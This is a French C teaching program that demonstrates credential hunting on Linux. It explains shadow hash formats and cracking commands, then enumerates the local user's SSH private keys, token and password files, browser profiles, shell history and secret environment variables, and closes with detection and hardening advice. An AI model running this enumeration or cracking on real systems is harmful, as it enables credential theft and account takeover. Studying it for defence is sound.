/*
 * OBJECTIF  : Comprendre l'extraction de credentials sur Linux
 * PREREQUIS : Bases C, fichiers systeme, cryptographie basique
 * COMPILE   : gcc -o example example.c
 *
 * Ce programme demontre les techniques d'extraction de credentials
 * sur Linux : /etc/shadow, cles SSH, fichiers de configuration,
 * navigateurs, et memoire. Demonstration pedagogique.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <pwd.h>
#include <dirent.h>
#include <errno.h>

/*
 * Etape 1 : Sources de credentials Linux
 */
static void explain_credential_sources(void) {
    printf("[*] Etape 1 : Sources de credentials sur Linux\n\n");

    printf("    ┌─────────────────────────────────────────────┐\n");
    printf("    │            CREDENTIALS LINUX                 │\n");
    printf("    │                                              │\n");
    printf("    │  ┌─── Systeme ──────────────────────┐       │\n");
    printf("    │  │ /etc/shadow    (hash passwords)   │       │\n");
    printf("    │  │ /etc/passwd    (users)             │       │\n");
    printf("    │  │ /etc/gshadow   (hash groupes)     │       │\n");
    printf("    │  └──────────────────────────────────┘       │\n");
    printf("    │                                              │\n");
    printf("    │  ┌─── SSH ──────────────────────────┐       │\n");
    printf("    │  │ ~/.ssh/id_rsa     (cle privee)    │       │\n");
    printf("    │  │ ~/.ssh/id_ed25519                 │       │\n");
    printf("    │  │ ~/.ssh/known_hosts                │       │\n");
    printf("    │  │ ~/.ssh/config                     │       │\n");
    printf("    │  └──────────────────────────────────┘       │\n");
    printf("    │                                              │\n");
    printf("    │  ┌─── Applications ─────────────────┐       │\n");
    printf("    │  │ Navigateurs (Chrome, Firefox)     │       │\n");
    printf("    │  │ Fichiers .env, .conf              │       │\n");
    printf("    │  │ Historique bash/zsh                │       │\n");
    printf("    │  │ Fichiers de config (.my.cnf, etc) │       │\n");
    printf("    │  └──────────────────────────────────┘       │\n");
    printf("    │                                              │\n");
    printf("    │  ┌─── Memoire ──────────────────────┐       │\n");
    printf("    │  │ /proc/pid/maps + /proc/pid/mem    │       │\n");
    printf("    │  │ Core dumps                        │       │\n");
    printf("    │  │ Swap (/dev/sda*)                  │       │\n");
    printf("    │  └──────────────────────────────────┘       │\n");
    printf("    └─────────────────────────────────────────────┘\n\n");
}

/*
 * Etape 2 : /etc/shadow et formats de hash
 */
static void explain_shadow_file(void) {
    printf("[*] Etape 2 : /etc/shadow et formats de hash\n\n");

    printf("    Format d'une ligne /etc/shadow :\n");
    printf("    ───────────────────────────────────\n");
    printf("    user:$id$salt$hash:lastchange:min:max:warn:...\n\n");

    printf("    Types de hash ($id$) :\n");
    printf("    ID  | Algorithme      | Exemple\n");
    printf("    ────|─────────────────|────────────────────────\n");
    printf("    $1$ | MD5             | (obsolete)\n");
    printf("    $5$ | SHA-256         | $5$salt$hash...\n");
    printf("    $6$ | SHA-512         | $6$salt$hash... (defaut)\n");
    printf("    $y$ | yescrypt        | (moderne, Debian 12+)\n\n");

    /* Verifier les permissions de /etc/shadow */
    struct stat st;
    if (stat("/etc/shadow", &st) == 0) {
        printf("    /etc/shadow :\n");
        printf("      Permissions : %o\n", st.st_mode & 0777);
        printf("      Proprietaire : uid=%d gid=%d\n", st.st_uid, st.st_gid);
        printf("      Lisible par nous : %s\n",
               access("/etc/shadow", R_OK) == 0 ? "OUI (!)" : "non");
    } else {
        printf("    /etc/shadow : %s\n", strerror(errno));
    }
    printf("\n");

    printf("    Cracking de hash :\n");
    printf("    ───────────────────────────────────\n");
    printf("    # Hashcat\n");
    printf("    hashcat -m 1800 hash.txt wordlist.txt  # SHA-512\n");
    printf("    hashcat -m 500  hash.txt wordlist.txt  # MD5\n\n");
    printf("    # John the Ripper\n");
    printf("    john --wordlist=rockyou.txt shadow.txt\n\n");
}

/*
 * Etape 3 : Cles SSH
 */
static void demo_ssh_keys(void) {
    printf("[*] Etape 3 : Extraction de cles SSH\n\n");

    char *home = getenv("HOME");
    if (!home) {
        printf("    (HOME non defini)\n\n");
        return;
    }

    char ssh_dir[256];
    snprintf(ssh_dir, sizeof(ssh_dir), "%s/.ssh", home);

    printf("    Repertoire SSH : %s\n\n", ssh_dir);

    DIR *dir = opendir(ssh_dir);
    if (!dir) {
        printf("    (impossible d'ouvrir %s)\n\n", ssh_dir);
        return;
    }

    printf("    Fichiers trouves :\n");
    printf("    ───────────────────────────────────\n");

    struct dirent *entry;
    while ((entry = readdir(dir))) {
        if (entry->d_name[0] == '.' &&
            (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0))
            continue;

        char path[512];
        snprintf(path, sizeof(path), "%s/%s", ssh_dir, entry->d_name);

        struct stat st;
        if (stat(path, &st) == 0) {
            const char *type = "?";
            if (strstr(entry->d_name, "id_rsa") && !strstr(entry->d_name, ".pub"))
                type = "CLE PRIVEE RSA";
            else if (strstr(entry->d_name, "id_ed25519") && !strstr(entry->d_name, ".pub"))
                type = "CLE PRIVEE ED25519";
            else if (strstr(entry->d_name, ".pub"))
                type = "cle publique";
            else if (strcmp(entry->d_name, "known_hosts") == 0)
                type = "hotes connus";
            else if (strcmp(entry->d_name, "config") == 0)
                type = "CONFIG SSH";
            else if (strcmp(entry->d_name, "authorized_keys") == 0)
                type = "cles autorisees";

            printf("      %-20s  %4ld octets  [%s]\n",
                   entry->d_name, (long)st.st_size, type);
        }
    }
    closedir(dir);

    printf("\n    Les cles privees non chiffrees sont directement\n");
    printf("    utilisables pour se connecter aux hotes dans known_hosts\n\n");

    printf("    Verifier si une cle est chiffree :\n");
    printf("    ───────────────────────────────────\n");
    printf("    head -2 ~/.ssh/id_rsa\n");
    printf("    -> Si 'Proc-Type: 4,ENCRYPTED' : chiffree\n");
    printf("    -> Sinon : utilisable directement\n\n");
}

/*
 * Etape 4 : Fichiers de configuration
 */
static void demo_config_files(void) {
    printf("[*] Etape 4 : Credentials dans les fichiers de config\n\n");

    printf("    Fichiers a chercher :\n");
    printf("    ───────────────────────────────────\n");

    const char *interesting_files[] = {
        "~/.my.cnf",          "password MySQL",
        "~/.pgpass",          "password PostgreSQL",
        "~/.netrc",           "credentials FTP/HTTP",
        "~/.git-credentials", "tokens Git",
        "~/.aws/credentials", "cles AWS",
        "~/.docker/config.json", "auth Docker registry",
        "~/.kube/config",     "tokens Kubernetes",
        "/etc/openvpn/*.conf","config VPN",
        NULL, NULL
    };

    for (int i = 0; interesting_files[i]; i += 2) {
        printf("    %-28s -> %s\n",
               interesting_files[i], interesting_files[i + 1]);
    }
    printf("\n");

    /* Chercher des .env dans le home */
    char *home = getenv("HOME");
    if (home) {
        printf("    Recherche de fichiers .env dans %s :\n", home);

        /* Verifier quelques emplacements courants */
        const char *check_files[] = {
            ".my.cnf", ".pgpass", ".netrc", ".git-credentials",
            ".env", NULL
        };

        int found = 0;
        for (int i = 0; check_files[i]; i++) {
            char path[512];
            snprintf(path, sizeof(path), "%s/%s", home, check_files[i]);
            if (access(path, F_OK) == 0) {
                struct stat st;
                stat(path, &st);
                printf("      [!] %s (%ld octets)\n", path, (long)st.st_size);
                found = 1;
            }
        }
        if (!found)
            printf("      (aucun fichier sensible trouve)\n");
        printf("\n");
    }
}

/*
 * Etape 5 : Navigateurs web
 */
static void explain_browser_creds(void) {
    printf("[*] Etape 5 : Credentials des navigateurs\n\n");

    printf("    Chrome/Chromium :\n");
    printf("    ───────────────────────────────────\n");
    printf("    ~/.config/google-chrome/Default/Login Data     (SQLite)\n");
    printf("    ~/.config/google-chrome/Default/Cookies         (SQLite)\n");
    printf("    ~/.config/chromium/Default/Login Data\n\n");

    printf("    Firefox :\n");
    printf("    ───────────────────────────────────\n");
    printf("    ~/.mozilla/firefox/*.default/logins.json\n");
    printf("    ~/.mozilla/firefox/*.default/key4.db  (cle de chiffrement)\n");
    printf("    ~/.mozilla/firefox/*.default/cookies.sqlite\n\n");

    printf("    Extraction Chrome (Linux) :\n");
    printf("    ───────────────────────────────────\n");
    printf("    // Les passwords sont chiffres avec:\n");
    printf("    // - DPAPI sur Windows\n");
    printf("    // - GNOME Keyring / KWallet sur Linux\n");
    printf("    // - Keychain sur macOS\n\n");
    printf("    // Sur Linux, la cle est souvent 'peanuts' ou\n");
    printf("    // recuperable via libsecret :\n");
    printf("    // secret-tool lookup application chrome\n\n");

    /* Verifier les profils Chrome et Firefox */
    char *home = getenv("HOME");
    if (home) {
        const char *browser_dirs[] = {
            ".config/google-chrome/Default",
            ".config/chromium/Default",
            ".mozilla/firefox",
            NULL
        };

        printf("    Profils detectes :\n");
        int found = 0;
        for (int i = 0; browser_dirs[i]; i++) {
            char path[512];
            snprintf(path, sizeof(path), "%s/%s", home, browser_dirs[i]);
            struct stat st;
            if (stat(path, &st) == 0 && S_ISDIR(st.st_mode)) {
                printf("      [!] %s\n", path);
                found = 1;
            }
        }
        if (!found) printf("      (aucun profil navigateur)\n");
        printf("\n");
    }
}

/*
 * Etape 6 : Historique et environnement
 */
static void demo_history_env(void) {
    printf("[*] Etape 6 : Historique et variables d'environnement\n\n");

    printf("    Historique shell (passwords en clair !) :\n");
    printf("    ───────────────────────────────────\n");
    printf("    mysql -u root -pMyPassword123\n");
    printf("    sshpass -p 'secret' ssh user@host\n");
    printf("    curl -u admin:password http://...\n");
    printf("    export AWS_SECRET_ACCESS_KEY=...\n\n");

    /* Verifier les fichiers d'historique */
    char *home = getenv("HOME");
    if (home) {
        const char *hist_files[] = {
            ".bash_history", ".zsh_history", ".python_history",
            ".mysql_history", ".psql_history", NULL
        };

        printf("    Fichiers d'historique :\n");
        for (int i = 0; hist_files[i]; i++) {
            char path[512];
            snprintf(path, sizeof(path), "%s/%s", home, hist_files[i]);
            struct stat st;
            if (stat(path, &st) == 0) {
                printf("      [!] %s (%ld octets)\n", path, (long)st.st_size);
            }
        }
        printf("\n");
    }

    /* Variables d'environnement sensibles */
    printf("    Variables d'environnement sensibles :\n");
    printf("    ───────────────────────────────────\n");
    const char *env_vars[] = {
        "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY",
        "DATABASE_URL", "DB_PASSWORD",
        "API_KEY", "SECRET_KEY",
        "GITHUB_TOKEN", "GITLAB_TOKEN",
        NULL
    };

    int found = 0;
    for (int i = 0; env_vars[i]; i++) {
        char *val = getenv(env_vars[i]);
        if (val) {
            printf("      [!] %s = %.*s...\n", env_vars[i],
                   3, val);
            found = 1;
        }
    }
    if (!found)
        printf("      (aucune variable sensible detectee)\n");
    printf("\n");
}

/*
 * Etape 7 : Detection et protection
 */
static void explain_detection(void) {
    printf("[*] Etape 7 : Detection et protection\n\n");

    printf("    Detecter l'extraction de credentials :\n");
    printf("    ───────────────────────────────────\n");
    printf("    1. auditd : surveiller les acces a /etc/shadow\n");
    printf("       auditctl -w /etc/shadow -p r -k shadow_read\n\n");
    printf("    2. Surveiller les acces aux cles SSH\n");
    printf("       auditctl -w /root/.ssh/ -p rwa -k ssh_access\n\n");
    printf("    3. Monitorer les acces aux fichiers navigateur\n");
    printf("    4. Detecter les outils de cracking (hashcat, john)\n\n");

    printf("    Protections :\n");
    printf("    ───────────────────────────────────\n");
    printf("    - Permissions strictes sur /etc/shadow (640)\n");
    printf("    - Chiffrer les cles SSH avec passphrase\n");
    printf("    - Utiliser un gestionnaire de secrets (Vault, etc.)\n");
    printf("    - Ne jamais stocker de mots de passe en clair\n");
    printf("    - Configurer HISTCONTROL=ignorespace\n");
    printf("    - Rotation reguliere des credentials\n");
    printf("    - PAM : configurer pam_faillock\n");
    printf("    - MFA (multi-factor authentication)\n\n");
}

int main(void) {
    printf("[*] Demo : Credential Extraction Linux\n\n");

    explain_credential_sources();
    explain_shadow_file();
    demo_ssh_keys();
    demo_config_files();
    explain_browser_creds();
    demo_history_env();
    explain_detection();

    printf("[+] Demo terminee avec succes\n");
    return 0;
}
